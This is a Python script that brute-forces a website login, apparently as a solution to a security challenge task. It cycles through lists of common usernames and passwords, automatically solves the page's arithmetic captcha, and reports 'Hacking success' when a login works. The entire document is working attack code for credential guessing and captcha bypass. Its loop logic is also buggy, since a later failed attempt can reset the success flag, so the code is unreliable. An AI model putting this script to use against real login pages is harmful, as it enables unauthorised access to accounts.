import mechanize
from bs4 import BeautifulSoup

br=mechanize.Browser()

siker=0

pu=["root","john","admin","printer"]
pp=["password","1234","qwerty","admin"]
i=0
j=0

while siker!=1:  
  for i in range(len(pu)):
    for j in range(len(pp)):
      #opening the attacked webpage
      br.open('https://afeladat2017.whiteshield.net/login') 
      print(f'user: {pu[i]}')
      print(f'pwd: {pp[j]}')
      #get the response
      response=br.response()

      #get the response from bs, just to see it in cool
      soup=BeautifulSoup(response.get_data(), "html.parser")


      #find the captcha by id (math) and put the string in the variable that will be something like this: <span id="math">10-1=</span>
      kapcsa=str(soup.find("span", {"id": "math"})) 

      #replace the string on the left of the math operation (that is fix!)
      kapcsa=kapcsa.replace('<span id="math">','') 

      #replace the string on the right of the math operation (that is fix!)
      kapcsa=kapcsa.replace('=</span>','') 

      #captcha result is 0 now
      result=0

      #if the '+' founded in the string, the operation will be: ADDITION
      if int(kapcsa.find("+"))>-1: 
          #afther the op symbol was found, separate the string by it, then do the math
          result=int(kapcsa.split("+")[0])+int(kapcsa.split("+")[1])

      #if the '-' founded in the string, the operation will be: SUBSTRACTION
      if int(kapcsa.find("-"))>-1:
          #afther the op symbol was found, separate the string by it, then do the math
          result=int(kapcsa.split("-")[0])-int(kapcsa.split("-")[1])

      #if the '/' founded in the string, the operation will be: DIVISION (it iss never used, but who cares)
      if int(kapcsa.find("/"))>-1:
          #afther the op symbol was found, separate the string by it, then do the math  
          result=int(kapcsa.split("/")[0])/int(kapcsa.split("/")[1])

      #if the '*' founded in the string, the operation will be: MULTIPLICATION
      if int(kapcsa.find("*"))>-1:
          #afther the op symbol was found, separate the string by it, then do the math
          result=int(kapcsa.split("*")[0])*int(kapcsa.split("*")[1])

      #select the num 0. form, (this is the only one)
      br.select_form(nr=0)
      #put the forms input fields names to variables (mind the number)
      uname=br.form.find_control(nr=1).name
      pwd=br.form.find_control(nr=2).name
      captcha=br.form.find_control(nr=4).name

      #set the input fields to the correct values
      br.form[uname]=pu[i]
      br.form[pwd]=pp[j]
      br.form[captcha]=str(result)     

      #submit
      br.submit()

      #read the response
      soup=BeautifulSoup(br.response().read(),"html.parser")
      s=str(soup)
      if (s.find("Success!")>0):
        siker=1
        u=pu[i]
        p=pp[j]
      else:
        siker=0
        print("Wroooong, trying again...")
    if siker==1:
      break
  if siker==1:
    break
print(f'Hacking success: user: {u}, pwd: {p}')
  
  
  